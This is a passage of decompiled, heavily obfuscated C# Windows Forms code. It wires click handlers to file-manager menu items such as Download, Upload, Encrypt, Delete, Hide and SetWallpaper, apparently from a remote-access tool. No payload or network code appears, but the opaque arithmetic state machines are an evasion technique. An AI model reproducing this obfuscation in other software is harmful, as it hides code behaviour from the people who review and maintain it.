          switch ((num2 = (uint) (num1 - -(701713087 * -~-688227056 - (-2039060249 ^ ~1960906513)) ^ -(~-615381624 + (2145374354 - -1463537355 + (-1989614963 ^ -1646632646))) ^ ~-(-1254634935 * 596496109))) % 8U)
          {
            case 0:
              ctxMenu.Opening += cancelEventHandler;
              num1 = (int) num2 * 355308585 ^ -1086444940;
              continue;
            case 1:
              ctxMenu.Opening -= cancelEventHandler;
              num1 = (int) num2 * -1614574056 ^ -151602571;
              continue;
            case 2:
              this._ctxMenu = value;
              num1 = 701023359;
              continue;
            case 3:
              goto label_3;
            case 4:
              ctxMenu = this._ctxMenu;
              int num3 = ctxMenu == null ? 873094748 : (num3 = 891231459);
              num1 = num3 ^ (int) num2 * 831774708;
              continue;
            case 5:
              goto label_1;
            case 6:
              int num4 = ctxMenu == null ? 1426832153 : (num4 = 1519254982);
              num1 = num4 ^ (int) num2 * -1008742698;
              continue;
            case 7:
              ctxMenu = this._ctxMenu;
              num1 = (int) num2 * 764614147 ^ -1824047116;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem DownloadToolStripMenuItem
    {
      get => this._DownloadToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DownloadToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = this._DownloadToolStripMenuItem;
label_1:
        int num1 = -1949794575;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((num1 ^ ~(-1947076639 * ((-2007900674 ^ -1905717505) + ~1242796796 ^ -(-1437811701 - -1621323076)))) * 350747577 + (~(-93612025 * 1535481831) + (2085291648 ^ -753839384 - 521734841)) - -~-1860409435) ^ 240735713)) % 7U)
          {
            case 0:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1858613520 ^ -650119000;
              continue;
            case 1:
              int num3 = toolStripMenuItem == null ? 2073295326 : (num3 = 1054951129);
              num1 = num3 ^ (int) num2 * 1265737743;
              continue;
            case 2:
              goto label_1;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 1877345880 ^ -1589406762;
              continue;
            case 4:
              goto label_3;
            case 5:
              this._DownloadToolStripMenuItem = value;
              toolStripMenuItem = this._DownloadToolStripMenuItem;
              num1 = -486914206;
              continue;
            case 6:
              int num4 = toolStripMenuItem == null ? 870643102 : (num4 = -1849195418);
              num1 = num4 ^ (int) num2 * -2119518150;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem UploadToolStripMenuItem
    {
      get => this._UploadToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.UploadToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = this._UploadToolStripMenuItem;
        if (toolStripMenuItem == null)
          goto label_5;
label_1:
        int num1 = 1098180823;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~((num1 + -((-1302394234 ^ 1245403143) + (1080644506 - 336367992) - (~-873476371 ^ 539384225 ^ 1835966115) + ~(201101127 + 692604784 + --1093292592)) - ~(338323592 - (-2027244881 * 734357917 + 861391955 * -85366196))) * 1396172427) * 1112596055 ^ -916291704)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_5;
            case 2:
              toolStripMenuItem = this._UploadToolStripMenuItem;
              num1 = (int) num2 * -1431646792 ^ -1279235782;
              continue;
            case 3:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1732288534 ^ -675287708;
              continue;
            case 4:
              int num3 = toolStripMenuItem == null ? -1824587494 : (num3 = -1462488908);
              num1 = num3 ^ (int) num2 * -1450072762;
              continue;
            case 5:
              goto label_3;
            case 6:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -1488298203 ^ 635829136;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        this._UploadToolStripMenuItem = value;
        num1 = 1952503005;
        goto label_2;
      }
    }

    [field: AccessedThroughProperty("FilesUpload")]
    internal virtual OpenFileDialog FilesUpload { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual ToolStripMenuItem FolderDownloadsToolStripMenuItem
    {
      get => this._FolderDownloadsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.FolderDownloadsToolStripMenuItem_Click);
label_1:
        int num1 = 1796302777;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) -(-1215452693 * -452043925 - (num2 * 1242823925 ^ (1980367087 ^ -628848136 ^ -1717002643 ^ -1121543145 ^ ~315955222) - ~((51829885 - 320239304) * 917690701)) * 1845571161 * 1455843145)) % 9U)
          {
            case 0:
              this._FolderDownloadsToolStripMenuItem = value;
              num1 = 394521150;
              continue;
            case 1:
              goto label_3;
            case 2:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 243838841 ^ 1164675612;
              continue;
            case 3:
              int num4 = toolStripMenuItem == null ? 155269219 : (num4 = 2067067630);
              num1 = num4 ^ (int) num3 * -546417679;
              continue;
            case 4:
              int num5 = toolStripMenuItem == null ? 710058346 : (num5 = -836577645);
              num1 = num5 ^ (int) num3 * -470284984;
              continue;
            case 5:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -1811065743 ^ 721001898;
              continue;
            case 6:
              goto label_1;
            case 7:
              toolStripMenuItem = this._FolderDownloadsToolStripMenuItem;
              num1 = (int) num3 * 369064595 ^ 50569266;
              continue;
            case 8:
              toolStripMenuItem = this._FolderDownloadsToolStripMenuItem;
              num1 = (int) num3 * -743583958 ^ 869937431;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual ToolStripMenuItem EncryptToolStripMenuItem
    {
      get => this._EncryptToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.EncryptToolStripMenuItem_Click);
label_1:
        int num1 = -1094636609;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) -(~(-(~(1381576065 ^ 599807225) + --928612150) - (num2 - (((-1168229892 - 1303124478 ^ 756016391 ^ 1963872853) - (2094830892 - 1940930595 - -2034107143) ^ -(902826189 * (710744499 + 1993653049))) + (~-1577959648 - ~79224157 - ~(1020910966 - 157462026) ^ -1775352218 ^ ~--1897471786)))) + 1949516364 + ~1089661430)) % 8U)
          {
            case 0:
              this._EncryptToolStripMenuItem = value;
              toolStripMenuItem = this._EncryptToolStripMenuItem;
              num1 = -1210043335;
              continue;
            case 1:
              toolStripMenuItem = this._EncryptToolStripMenuItem;
              num1 = (int) num3 * -970133652 ^ 960057673;
              continue;
            case 2:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 125513616 ^ 571399788;
              continue;
            case 3:
              int num4 = toolStripMenuItem == null ? 450380035 : (num4 = -170000791);
              num1 = num4 ^ (int) num3 * -1495450047;
              continue;
            case 4:
              goto label_3;
            case 5:
              goto label_1;
            case 6:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 2087647958 ^ -439062644;
              continue;
            case 7:
              int num5 = toolStripMenuItem == null ? -1913419740 : (num5 = -1501943394);
              num1 = num5 ^ (int) num3 * -12741672;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem DecodeToolStripMenuItem
    {
      get => this._DecodeToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DecodeToolStripMenuItem_Click);
label_1:
        int num1 = -4651447;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~~(num1 - -((-700345643 ^ 998764335 * 1510427862) - (~1634345693 ^ 13168113 - 1663530299) ^ 1968565875)) * 811498103 - (-670067261 - -705195245) ^ -1627102546)) % 8U)
          {
            case 0:
              int num3 = toolStripMenuItem == null ? -806607437 : (num3 = -926026915);
              num1 = num3 ^ (int) num2 * -1499871694;
              continue;
            case 1:
              toolStripMenuItem = this._DecodeToolStripMenuItem;
              num1 = (int) num2 * -1351996986 ^ -1162412948;
              continue;
            case 2:
              int num4 = toolStripMenuItem == null ? -249329384 : (num4 = 893883001);
              num1 = num4 ^ (int) num2 * -1291265797;
              continue;
            case 3:
              this._DecodeToolStripMenuItem = value;
              toolStripMenuItem = this._DecodeToolStripMenuItem;
              num1 = 640314788;
              continue;
            case 4:
              goto label_3;
            case 5:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -1239303955 ^ -1580178294;
              continue;
            case 6:
              goto label_1;
            case 7:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 1525366180 ^ 1216369850;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem DeleteToolStripMenuItem
    {
      get => this._DeleteToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteToolStripMenuItem_Click);
label_1:
        int num1 = 1395188374;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (1766840778 - ~(num2 + -(1823318613 * -~407766433 + (-129163425 - 1561644324 + 25692848)) - ((~-1209457590 ^ 1752458385 ^ -427820635) + ~(-679748654 ^ 1840988927) - ~--1265794903) + ~(-1082856164 - 1860450908 + -505560917 * -597590550) ^ ~-1775644645 - ~274560020))) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = toolStripMenuItem == null ? -198226768 : (num4 = -836439977);
              num1 = num4 ^ (int) num3 * 1766079365;
              continue;
            case 2:
              this._DeleteToolStripMenuItem = value;
              toolStripMenuItem = this._DeleteToolStripMenuItem;
              int num5;
              num1 = num5 = toolStripMenuItem == null ? 647359226 : (num5 = 605613368);
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -694613202 ^ 1687808224;
              continue;
            case 4:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 1843278876 ^ -1182314343;
              continue;
            case 5:
              goto label_3;
            case 6:
              toolStripMenuItem = this._DeleteToolStripMenuItem;
              num1 = (int) num3 * 368599298 ^ -1834490164;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem EditToolStripMenuItem
    {
      get => this._EditToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.EditToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = this._EditToolStripMenuItem;
label_1:
        int num1 = 1262018529;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-~(-(num1 ^ ---2060078617 + (~(1452274437 + 725381363) - -~-203082694) ^ (-1630556215 - 1829881291 ^ -1645930885 * -1226052894) * -973515245 * 1126200743) * 181322045) - 1919534376)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = toolStripMenuItem == null ? -1590882134 : (num3 = -1920449926);
              num1 = num3 ^ (int) num2 * 1269251545;
              continue;
            case 2:
              this._EditToolStripMenuItem = value;
              toolStripMenuItem = this._EditToolStripMenuItem;
              num1 = -1089893238;
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 679005332 ^ 36628292;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num4 = toolStripMenuItem == null ? 669304296 : (num4 = 2055406970);
              num1 = num4 ^ (int) num2 * -13483775;
              continue;
            case 6:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -244780386 ^ 311102015;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem ZipToolStripMenuItem
    {
      get => this._ZipToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ZipToolStripMenuItem_Click);
label_1:
        int num1 = 1748436982;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (~(-(1311442952 ^ -468557383 * (--1894216777 + (-573539978 - 1735470211))) - num2) * -1838851361)) % 9U)
          {
            case 0:
              toolStripMenuItem = this._ZipToolStripMenuItem;
              num1 = (int) num3 * -339348565 ^ 18804612;
              continue;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 908539418 ^ 1621590526;
              continue;
            case 2:
              goto label_3;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 1195126319 ^ -1925694184;
              continue;
            case 4:
              int num4 = toolStripMenuItem == null ? -1338177008 : (num4 = -184622813);
              num1 = num4 ^ (int) num3 * 1182856302;
              continue;
            case 5:
              goto label_1;
            case 6:
              this._ZipToolStripMenuItem = value;
              num1 = 2068650966;
              continue;
            case 7:
              toolStripMenuItem = this._ZipToolStripMenuItem;
              num1 = (int) num3 * -522228445 ^ -682698423;
              continue;
            case 8:
              int num5 = toolStripMenuItem == null ? 1605820552 : (num5 = -1630758267);
              num1 = num5 ^ (int) num3 * 658038589;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual ToolStripMenuItem UnZipToolStripMenuItem
    {
      get => this._UnZipToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.UnZipToolStripMenuItem_Click);
label_1:
        int num1 = 2080947360;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~(-(num1 - (570201317 * ~~(-1902621434 * -563946011) - ((-1601798989 * ~361126483 ^ ~1801427023) + -(-1374118908 - 441055999)))) ^ -1895408528 + (-751634482 ^ -1657143111) - (~-1336995477 - -687865671)) * 97047083)) % 9U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem = this._UnZipToolStripMenuItem;
              num1 = (int) num2 * 1656892986 ^ -407686057;
              continue;
            case 2:
              int num3 = toolStripMenuItem == null ? 1057115236 : (num3 = 1538043880);
              num1 = num3 ^ (int) num2 * -1603647335;
              continue;
            case 3:
              toolStripMenuItem = this._UnZipToolStripMenuItem;
              num1 = (int) num2 * 1309382017 ^ -1644563175;
              continue;
            case 4:
              goto label_3;
            case 5:
              int num4 = toolStripMenuItem == null ? 2044743149 : (num4 = -184388817);
              num1 = num4 ^ (int) num2 * -1633356477;
              continue;
            case 6:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1047470246 ^ 1049348486;
              continue;
            case 7:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 1088939659 ^ -1389209629;
              continue;
            case 8:
              this._UnZipToolStripMenuItem = value;
              num1 = 1739053984;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual ToolStripMenuItem RenameToolStripMenuItem
    {
      get => this._RenameToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RenameToolStripMenuItem_Click);
label_1:
        int num1 = -790729503;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (---num1 * 1173421401 - 1561433657 - 1746557291)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -430609490 ^ 1634520424;
              continue;
            case 2:
              int num3 = toolStripMenuItem == null ? -1476135492 : (num3 = -1198413478);
              num1 = num3 ^ (int) num2 * -1526110056;
              continue;
            case 3:
              goto label_1;
            case 4:
              this._RenameToolStripMenuItem = value;
              toolStripMenuItem = this._RenameToolStripMenuItem;
              num1 = -419497653;
              continue;
            case 5:
              toolStripMenuItem = this._RenameToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? -1855867403 : (num4 = 2084600472);
              num1 = num4 ^ (int) num2 * 77967632;
              continue;
            case 6:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 82167655 ^ 2024171753;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem HideToolStripMenuItem
    {
      get => this._HideToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.HideToolStripMenuItem_Click);
label_1:
        int num1 = -594092836;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 * -1574920171 + ((~-1940504205 + --234005064 ^ -995115008 * 1830271097 - (-1328339396 - 188806368)) - ~~~1012619895) - ((532825980 - -388543546) * -369741893 - (1180250207 * 705968049 + (1185635596 + 495216546))) ^ 167317924) + -391402387) * 400404535)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem = this._HideToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? 924055661 : (num3 = 280474360);
              num1 = num3 ^ (int) num2 * -430921022;
              continue;
            case 2:
              goto label_3;
            case 3:
              this._HideToolStripMenuItem = value;
              toolStripMenuItem = this._HideToolStripMenuItem;
              num1 = -1224151282;
              continue;
            case 4:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -1169399366 ^ -2075804331;
              continue;
            case 5:
              int num4 = toolStripMenuItem == null ? 578124540 : (num4 = -1347653439);
              num1 = num4 ^ (int) num2 * 1490634578;
              continue;
            case 6:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 1610082893 ^ 155891871;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem ShowToolStripMenuItem
    {
      get => this._ShowToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ShowToolStripMenuItem_Click);
label_1:
        int num1 = 1829161806;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-num1 * -1742740091 - 1707592120 ^ ~(636242220 + 1633013812)) + 998580327 - -1815820142)) % 8U)
          {
            case 0:
              toolStripMenuItem = this._ShowToolStripMenuItem;
              num1 = (int) num2 * 1931211968 ^ -1156393744;
              continue;
            case 1:
              goto label_3;
            case 2:
              toolStripMenuItem = this._ShowToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? 439568941 : (num3 = -494502649);
              num1 = num3 ^ (int) num2 * -659855404;
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -1612900691 ^ 1620960446;
              continue;
            case 4:
              int num4 = toolStripMenuItem == null ? 157617685 : (num4 = 240960151);
              num1 = num4 ^ (int) num2 * -617649785;
              continue;
            case 5:
              this._ShowToolStripMenuItem = value;
              num1 = -1596752156;
              continue;
            case 6:
              goto label_1;
            case 7:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1012669785 ^ 422119674;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem AddFilesToolStripMenuItem
    {
      get => this._AddFilesToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AddFilesToolStripMenuItem_Click);
label_1:
        int num1 = 1598268022;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) ((--643134014 - (1788800907 - 1686147239 + (1571194575 ^ -1600925446) + (1968744774 * 51550797 ^ --30613077) - ((-(-712506067 * (-1522391869 * -2050759399)) ^ ~(~-829197798 ^ -154276746 * -1831570629)) - -num2))) * -1758436629 ^ -570934274)) % 8U)
          {
            case 0:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 1814720431 ^ -1740154587;
              continue;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -334989867 ^ 1997957333;
              continue;
            case 2:
              int num4 = toolStripMenuItem == null ? 323850172 : (num4 = -1742429242);
              num1 = num4 ^ (int) num3 * 1635862286;
              continue;
            case 3:
              int num5 = toolStripMenuItem == null ? 416501675 : (num5 = 961536569);
              num1 = num5 ^ (int) num3 * -1867758006;
              continue;
            case 4:
              goto label_1;
            case 5:
              toolStripMenuItem = this._AddFilesToolStripMenuItem;
              num1 = (int) num3 * -738591090 ^ 1825372327;
              continue;
            case 6:
              goto label_3;
            case 7:
              this._AddFilesToolStripMenuItem = value;
              toolStripMenuItem = this._AddFilesToolStripMenuItem;
              num1 = -2082197484;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem OpenToolStripMenuItem
    {
      get => this._OpenToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OpenToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = this._OpenToolStripMenuItem;
label_1:
        int num1 = 1400765255;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(num1 - ~(1536574719 * (2061992741 - (1397036003 - 1497401861) ^ 1320405127 * -1822133088 ^ -1704864844))) * 1941927705 - 784163755 * -2081940252 ^ 391448633 - 2115075551)) % 8U)
          {
            case 0:
              int num3 = toolStripMenuItem == null ? -1338798930 : (num3 = -645720855);
              num1 = num3 ^ (int) num2 * -375798355;
              continue;
            case 1:
              this._OpenToolStripMenuItem = value;
              num1 = 1222831876;
              continue;
            case 2:
              goto label_1;
            case 3:
              toolStripMenuItem = this._OpenToolStripMenuItem;
              num1 = (int) num2 * 1040868948 ^ -1464692361;
              continue;
            case 4:
              int num4 = toolStripMenuItem == null ? -2142680710 : (num4 = -751630152);
              num1 = num4 ^ (int) num2 * 1951814882;
              continue;
            case 5:
              goto label_3;
            case 6:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -640908951 ^ -1645912200;
              continue;
            case 7:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1170200444 ^ 573884598;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Timer TOpacity
    {
      get => this._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
        Timer topacity = this._TOpacity;
label_1:
        int num1 = -1542077968;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(((num1 ^ ~(1070814655 * ---819414115)) - ~-1544523031 - -913594655) * 1275860947)) % 6U)
          {
            case 0:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * 337100879 ^ 5560390;
              continue;
            case 1:
              this._TOpacity = value;
              topacity = this._TOpacity;
              int num3;
              num1 = num3 = topacity == null ? 104922602 : (num3 = -36439587);
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            case 4:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * 1267086617 ^ 673197848;
              continue;
            case 5:
              int num4 = topacity == null ? -792377531 : (num4 = -1084150728);
              num1 = num4 ^ (int) num2 * -1849697173;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual ToolStripMenuItem CutToolStripMenuItem
    {
      get => this._CutToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CutToolStripMenuItem_Click);
label_1:
        int num1 = -438805239;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) ~~(-408715775 * -139828911 - (-2040243082 - 281553501 - (-815868175 * (-1613819989 * (-1921715584 ^ -1744366439) - 737612951 * --1475713353) - (num2 + ~(-1636508429 - 699307511 - (-1472580330 - -879416929) - 855931087 * ~1228135498 + 16833457)))))) % 8U)
          {
            case 0:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -1921809137 ^ 19979022;
              continue;
            case 1:
              int num4 = toolStripMenuItem == null ? 528923567 : (num4 = -54933882);
              num1 = num4 ^ (int) num3 * -1626231821;
              continue;
            case 2:
              goto label_3;
            case 3:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 1106655070 ^ 2125046462;
              continue;
            case 4:
              this._CutToolStripMenuItem = value;
              num1 = -113305717;
              continue;
            case 5:
              toolStripMenuItem = this._CutToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? -334190817 : (num5 = 562815369);
              num1 = num5 ^ (int) num3 * -2002926619;
              continue;
            case 6:
              goto label_1;
            case 7:
              toolStripMenuItem = this._CutToolStripMenuItem;
              num1 = (int) num3 * 2123227821 ^ 103242588;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem CopyToolStripMenuItem
    {
      get => this._CopyToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CopyToolStripMenuItem_Click);
label_1:
        int num1 = 1775566726;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~-num1 + -1856751533) * 1142758223 * -2069477789 ^ 1931511313)) % 8U)
          {
            case 0:
              int num3 = toolStripMenuItem == null ? -1009910340 : (num3 = 637377800);
              num1 = num3 ^ (int) num2 * 1685241674;
              continue;
            case 1:
              toolStripMenuItem = this._CopyToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? 1698587491 : (num4 = 1556116599);
              num1 = num4 ^ (int) num2 * -536029738;
              continue;
            case 2:
              this._CopyToolStripMenuItem = value;
              num1 = 1352483319;
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 1758650779 ^ -1177873011;
              continue;
            case 4:
              toolStripMenuItem = this._CopyToolStripMenuItem;
              num1 = (int) num2 * -1315658645 ^ 36495511;
              continue;
            case 5:
              goto label_1;
            case 6:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -1594998108 ^ 1770633789;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem PasteToolStripMenuItem
    {
      get => this._PasteToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PasteToolStripMenuItem_Click);
label_1:
        int num1 = -1325818090;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) -(~-(1563670555 - 1991544404) - (~num2 - (1998177451 - (~-1973072031 ^ -1919197998) ^ (203349053 + 1103560147 ^ -799342467 ^ -2012155511) - ---208355991)) - ((773548419 ^ 407474330) - 1492021134 * 1484065829))) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem = this._PasteToolStripMenuItem;
              num1 = (int) num3 * 1807993228 ^ 1574761670;
              continue;
            case 2:
              int num4 = toolStripMenuItem == null ? 1417384785 : (num4 = 1825735158);
              num1 = num4 ^ (int) num3 * -1630137566;
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 1383205855 ^ -1400492563;
              continue;
            case 4:
              this._PasteToolStripMenuItem = value;
              toolStripMenuItem = this._PasteToolStripMenuItem;
              int num5;
              num1 = num5 = toolStripMenuItem == null ? -1363509259 : (num5 = -824319808);
              continue;
            case 5:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -668952637 ^ 1412726167;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem SetWallpaperToolStripMenuItem
    {
      get => this._SetWallpaperToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SetWallpaperToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = this._SetWallpaperToolStripMenuItem;
label_1:
        int num1 = 140611121;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 ^ (-1245147980 ^ -1367378698 - -1804599881) * -1444126705 + (~1651927209 ^ -(1072021687 - -851688515)) - (1322699309 * --574161691 ^ -((-1111575560 ^ 885636524) - 1670714837)) ^ ~((~1307801058 ^ -1069804169) - (1125188552 - 1438031095 + (794467768 - 1455463603)))) - (-(653396425 * 1311609222) - (2032474475 + 1828315301 + ~-1590832673)) - -(1729731071 - 1053341320) ^ -691420346 * 603986075) - 1042321004)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 257573792 ^ 1649792155;
              continue;
            case 2:
              this._SetWallpaperToolStripMenuItem = value;
              num1 = 798748474;
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 800045415 ^ -982139312;
              continue;
            case 4:
              int num3 = toolStripMenuItem == null ? -1075783665 : (num3 = -182748070);
              num1 = num3 ^ (int) num2 * 1915557635;
              continue;
            case 5:
              toolStripMenuItem = this._SetWallpaperToolStripMenuItem;
              num1 = (int) num2 * 977575754 ^ 1214435813;
              continue;
            case 6:
              int num4 = toolStripMenuItem == null ? -1980325539 : (num4 = -1732570124);
